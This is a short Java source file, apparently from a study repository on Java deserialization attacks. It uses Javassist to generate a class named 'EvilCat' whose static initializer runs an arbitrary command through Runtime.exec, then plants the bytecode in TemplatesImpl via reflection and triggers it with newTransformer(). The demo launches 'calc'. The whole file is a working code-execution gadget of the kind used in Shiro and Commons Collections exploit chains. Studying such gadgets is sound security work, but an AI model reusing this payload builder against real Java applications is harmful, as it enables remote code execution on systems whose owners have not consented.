package com.bytecode;

import javassist.*;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.apache.xalan.xsltc.trax.TransformerFactoryImpl;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Base64;

import static com.util.Reflections.setFieldValue;

public class HelloTemplatesImpl {
//    static void setFieldValue(final Object obj, final String fieldName, final Object value)throws Exception{
//        Field declaredField = obj.getClass().getDeclaredField(fieldName);
//        declaredField.setAccessible(true);
//        declaredField.set(obj,value);
//    }
    public static byte[] genByteCode(String cmd1) throws CannotCompileException, IOException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\""+cmd1+"\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错

        // 写入.class 文件
        // 将我的恶意类转成字节码，并且反射设置 bytecodes
        byte[] classBytes = cc.toBytecode();
        return classBytes;
    }
    public static void main(String[] args) throws Exception {
        //       ClassPool pool = ClassPool.getDefault();
        //CtClass clazz =pool.get(com.govuln.shiroattack.Evil.class.getName());
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {genByteCode("calc")});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        obj.newTransformer();
    }
}
